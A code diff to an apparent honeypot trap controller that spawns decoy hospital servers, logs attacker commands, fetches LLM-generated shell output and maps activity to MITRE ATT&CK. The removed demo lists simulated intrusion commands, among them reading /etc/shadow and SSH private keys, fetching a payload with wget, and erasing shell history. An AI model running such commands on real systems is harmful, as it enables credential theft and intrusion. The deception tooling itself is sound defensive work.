@@ -211,7 +211,7 @@ INSTITUTION_PROFILES: Dict[str, Dict[str, Any]] = {
             """),
             "/home/his_admin/.ssh/authorized_keys": (
                 "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2m8eXfakeKeyDataForHoneypotHISAdmin"
-                "kL9mNpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx his_admin@aiims-backup-01\n"
+                "kL9mNpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj\n"
             ),
             "/var/log/auth.log.snippet": textwrap.dedent("""\
                 Mar 15 02:14:33 aiims-backup-01 sshd[12341]: Accepted publickey for his_admin from 10.10.0.5 port 43210 ssh2
@@ -910,6 +910,7 @@ class TrapController:
         self.kafka     = KafkaTelemetryStream()
         self.reporter  = ThreatIntelReporter()
         self._sessions: Dict[str, TrapSession] = {}
+        self.llm_client = OllamaClient() # Add Ollama client
 
     # ------------------------------------------------------------------ #
     #  deploy_trap                                                         #
@@ -934,6 +935,22 @@ class TrapController:
             session_id, attacker_ip, anomaly_score, institution_type,
         )
 
+        # Use an async task to avoid blocking the main thread
+        loop = asyncio.get_event_loop()
+        task = loop.create_task(self._deploy_trap_async(session_id, attacker_ip, anomaly_score, institution_type))
+        
+        # This is a fire-and-forget approach for the demo.
+        # In production, you'd want to manage this task.
+        return task
+
+
+    async def _deploy_trap_async(
+        self,
+        session_id: str,
+        attacker_ip: str,
+        anomaly_score: float,
+        institution_type: str,
+    ) -> TrapSession:
         trap = self.spawner.spawn(attacker_ip, institution_type)
         self.injector.inject(self.spawner, trap)
 
@@ -959,38 +976,60 @@ class TrapController:
         )
         self.kafka.emit(start_event)
 
-        # Schedule auto-teardown
-        threading.Timer(
-            TRAP_TIMEOUT_SECONDS,
-            self.teardown_trap,
-            args=(session_id,),
-        ).start()
+        # The AttackerRedirector part is complex to simulate here without a real socket.
+        # For the simulation, we will assume commands are logged via an API call.
+        # In a real scenario, the redirector would call `log_command`.
 
         log.info("Trap deployed: session=%s container=%s port=%d",
                  session_id, trap.container_id[:12], trap.host_port)
+        
+        # Schedule auto-teardown
+        loop = asyncio.get_event_loop()
+        loop.call_later(
+            TRAP_TIMEOUT_SECONDS,
+            lambda: asyncio.create_task(self.teardown_trap(session_id))
+        )
+
         return session
 
     # ------------------------------------------------------------------ #
     #  log_command                                                         #
     # ------------------------------------------------------------------ #
 
-    def log_command(
+    async def log_command(
         self,
         session_id:    str,
         command:       str,
-        response:      str = "",
         anomaly_score: float = 0.5,
     ) -> TrapEvent:
         """
-        Record an attacker command, map it to MITRE ATT&CK TTPs,
-        and stream the event to Kafka.
+        Record an attacker command, get a response from the LLM, 
+        map it to MITRE ATT&CK TTPs, and stream the event to Kafka.
         """
-        from honeypot.server import extract_ttps   # reuse Module 4's TTP mapper
-        ttps = extract_ttps(command)
-
         session = self._sessions.get(session_id)
         if not session:
             raise KeyError(f"Unknown session_id: {session_id}")
+
+        # Get LLM response
+        response = await self.llm_client.generate(command)
+
+        # Extract TTPs
+        ttps = extract_ttps(command)
+
+        # Determine severity based on TTPs
+        ttp_severity = "low"
+        if any(t['id'].startswith('T1003') for t in ttps): # Credential Dumping
+            ttp_severity = "critical"
+        elif ttps:
+            ttp_severity = "high"
+
+        final_severity = self._score_to_severity(anomaly_score)
+        # Logic to decide final severity could be more complex
+        if ttp_severity == "critical":
+            final_severity = "critical"
+        elif ttp_severity == "high" and final_severity != "critical":
+            final_severity = "high"
+
 
         event = TrapEvent(
             session_id=session_id,
@@ -998,229 +1037,69 @@ class TrapController:
             institution=session.institution_type,
             event_type="command",
             command=command[:512],
-            response=response[:1024],
+            response=response,
             ttps=ttps,
             anomaly_score=anomaly_score,
             container_id=session.trap.container_id if session.trap else "mock",
-            severity=self._score_to_severity(anomaly_score),
+            severity=final_severity,
         )
         session.events.append(event)
         self.kafka.emit(event)
+
+        log.info(
+            "Command logged | session=%s | command='%s' | ttps=%s",
+            session_id, command, [t.get("id") for t in ttps]
+        )
         return event
 
     # ------------------------------------------------------------------ #
     #  teardown_trap                                                       #
     # ------------------------------------------------------------------ #
 
-    def teardown_trap(self, session_id: str) -> Optional[dict]:
+    async def teardown_trap(self, session_id: str) -> None:
         """
-        End the trap session:
-          1. Emit session-end event to Kafka
-          2. Stop and remove the Docker container
-          3. Generate and save the threat intel report
-          4. Return the report dict
+        Stop the container, generate threat intel report, and emit session-end event.
         """
+        log.info("Tearing down trap for session %s", session_id)
         session = self._sessions.pop(session_id, None)
         if not session:
-            log.warning("teardown_trap called for unknown session: %s", session_id)
-            return None
+            log.warning("Attempted to tear down non-existent session: %s", session_id)
+            return
 
         session.end_time = datetime.now(timezone.utc).isoformat()
 
+        if session.trap:
+            self.spawner.teardown(session.trap.container_id)
+
+        # Generate report
+        self.reporter.generate(session)
+
+        # Emit session-end event
         end_event = TrapEvent(
             session_id=session_id,
             attacker_ip=session.attacker_ip,
             institution=session.institution_type,
             event_type="session_end",
             command="<SESSION ENDED>",
-            anomaly_score=session.anomaly_score,
+            anomaly_score=max(ev.anomaly_score for ev in session.events) if session.events else session.anomaly_score,
             container_id=session.trap.container_id if session.trap else "mock",
-            severity=self._score_to_severity(session.anomaly_score),
+            severity=max((ev.severity for ev in session.events), key=lambda s: {"low":1, "medium":2, "high":3, "critical":4}.get(s,0), default="low"),
         )
+        setattr(end_event, 'total_commands', len(session.events))
         self.kafka.emit(end_event)
         self.kafka.flush()
+        log.info("Trap teardown complete for session %s", session_id)
 
-        if session.trap:
-            self.spawner.teardown(session.trap.container_id)
-
-        report = self.reporter.generate(session)
-        log.info(
-            "Trap session closed: %s | commands=%d | TTPs=%d | duration=%ds",
-            session_id,
-            len(session.events),
-            sum(len(ev.ttps) for ev in session.events),
-            session.duration_seconds,
-        )
-        return report
-
-    # ------------------------------------------------------------------ #
-    #  helpers                                                             #
-    # ------------------------------------------------------------------ #
-
-    @staticmethod
-    def _score_to_severity(score: float) -> str:
-        if score >= 0.85:
+    def _score_to_severity(self, score: float, ttps: list = []) -> str:
+        if any(t['id'].startswith('T1003') for t in ttps):
             return "critical"
-        elif score >= 0.65:
+        if score > 0.95:
+            return "critical"
+        if score > 0.85:
             return "high"
-        elif score >= 0.40:
+        if score > 0.7:
             return "medium"
         return "low"
 
-    @property
-    def active_sessions(self) -> List[TrapSession]:
-        return list(self._sessions.values())
-
-
-# ---------------------------------------------------------------------------
-# Async shell helper — calls the Honeypot Shell API (Module 4)
-# ---------------------------------------------------------------------------
-
-async def _call_honeypot_api(command: str, session_context: str = "") -> str:
-    """Ask the Honeypot Shell API (Module 4) to generate a realistic response."""
-    if not HTTPX_AVAILABLE:
-        return _static_fallback(command)
-    try:
-        async with httpx.AsyncClient(timeout=10.0) as client:
-            resp = await client.post(
-                HONEYPOT_SHELL_API,
-                json={"command": command, "session_context": session_context},
-            )
-            resp.raise_for_status()
-            return resp.json().get("output", "")
-    except Exception as exc:
-        log.debug("Honeypot API unavailable (%s) — using static fallback", exc)
-        return _static_fallback(command)
-
-
-def _static_fallback(command: str) -> str:
-    """Minimal static responses for demo mode when Ollama is unavailable."""
-    cmd = command.strip().split()[0] if command.strip() else ""
-    responses = {
-        "whoami":   "root",
-        "id":       "uid=0(root) gid=0(root) groups=0(root)",
-        "hostname": "aiims-backup-01",
-        "uname":    "Linux aiims-backup-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
-        "ls":       "bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var",
-        "pwd":      "/root",
-        "ps":       (
-            "  PID TTY          TIME CMD\n"
-            "    1 ?        00:00:02 systemd\n"
-            "  342 ?        00:00:00 sshd\n"
-            "  987 ?        00:05:11 mysqld\n"
-            " 1234 pts/0    00:00:00 bash\n"
-            " 1235 pts/0    00:00:00 ps"
-        ),
-        "env": (
-            "USER=root\nHOME=/root\nSHELL=/bin/bash\n"
-            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
-            "LOGNAME=root\nTERM=xterm-256color"
-        ),
-    }
-    return responses.get(cmd, f"bash: {cmd}: command not found")
-
-
-# ---------------------------------------------------------------------------
-# Demo / smoke-test
-# ---------------------------------------------------------------------------
-
-def run_demo() -> None:
-    """
-    Simulates a complete attacker session end-to-end without requiring
-    Docker, Kafka, or the Honeypot API to be running.
-    """
-    print("\n" + "=" * 70)
-    print("  PROJECT CHAKRAVYUH — Module 3: Trap Controller Demo")
-    print("=" * 70 + "\n")
-
-    controller = TrapController()
-
-    # Simulate ML Detector firing with a high anomaly score
-    ATTACKER_IP    = "185.220.101.47"
-    ANOMALY_SCORE  = 0.91
-    INSTITUTION    = "hospital"
-
-    print(f"[1/5] ML Detector Alert: {ATTACKER_IP} | score={ANOMALY_SCORE} | type={INSTITUTION}")
-    session = controller.deploy_trap(
-        attacker_ip=ATTACKER_IP,
-        anomaly_score=ANOMALY_SCORE,
-        institution_type=INSTITUTION,
-    )
-    print(f"      ✓ Trap deployed | session={session.session_id}")
-    print(f"      ✓ Container: {session.trap.container_id[:16]} | port={session.trap.host_port}")
-
-    # Simulate attacker commands observed in the session
-    attacker_commands = [
-        ("whoami",                     0.91),
-        ("id",                         0.91),
-        ("uname -a",                   0.88),
-        ("cat /etc/passwd",            0.94),
-        ("cat /etc/shadow",            0.97),
-        ("ls /var/backups",            0.85),
-        ("find / -name '*.sql*' 2>/dev/null", 0.92),
-        ("cat /opt/his/config.xml",    0.95),
-        ("grep -r password /etc/",     0.96),
-        ("wget http://185.x.x.x/payload.sh", 0.99),
-        ("chmod +x payload.sh",        0.98),
-        ("crontab -e",                 0.97),
-        ("HISTFILE=/dev/null",         0.99),
-        ("cat /home/his_admin/.ssh/id_rsa", 0.99),
-        ("ssh his_admin@10.10.0.1",    0.99),
-    ]
-
-    print(f"\n[2/5] Simulating {len(attacker_commands)} attacker commands...\n")
-    for cmd, score in attacker_commands:
-        response = asyncio.run(_call_honeypot_api(cmd))
-        event = controller.log_command(
-            session_id=session.session_id,
-            command=cmd,
-            response=response,
-            anomaly_score=score,
-        )
-        ttp_ids = [t["id"] for t in event.ttps]
-        print(f"  $ {cmd:<45}  TTPs: {ttp_ids if ttp_ids else '—'}")
-        time.sleep(0.05)
-
-    print(f"\n[3/5] Tearing down trap and generating report...")
-    report = controller.teardown_trap(session.session_id)
-
-    print(f"\n[4/5] Threat Intel Report: {report['report_id']}")
-    print(f"      Duration       : {report['session']['duration_s']}s")
-    print(f"      Total commands : {report['session']['total_commands']}")
-    print(f"      Max severity   : {report['session']['max_severity'].upper()}")
-    print(f"      Tactics seen   : {', '.join(report['mitre_attack']['tactic_coverage'])}")
-    print(f"      TTPs observed  : {len(report['mitre_attack']['ttps_observed'])}")
-
-    if report.get("iocs", {}).get("outbound_urls"):
-        print(f"      Outbound URLs  : {report['iocs']['outbound_urls']}")
-
-    print(f"\n      → {report['recommendation']}")
-
-    print(f"\n[5/5] Report saved to: trap_reports/report_{report['report_id']}.json")
-    print("\n" + "=" * 70)
-    print("  Demo complete. All modules functional.")
-    print("=" * 70 + "\n")
-
-
-if __name__ == "__main__":
-    import argparse
-
-    parser = argparse.ArgumentParser(
-        description="Chakravyuh Module 3 — Generative Trap Controller"
-    )
-    parser.add_argument(
-        "--demo",
-        action="store_true",
-        default=True,
-        help="Run the full attacker session simulation (default: True)",
-    )
-    parser.add_argument(
-        "--institution",
-        choices=list(INSTITUTION_PROFILES.keys()),
-        default="hospital",
-        help="Institution type to simulate",
-    )
-    args = parser.parse_args()
-
-    if args.demo:
-        run_demo()
+    def get_session(self, session_id: str) -> Optional[TrapSession]:
+        return self._sessions.get(session_id)
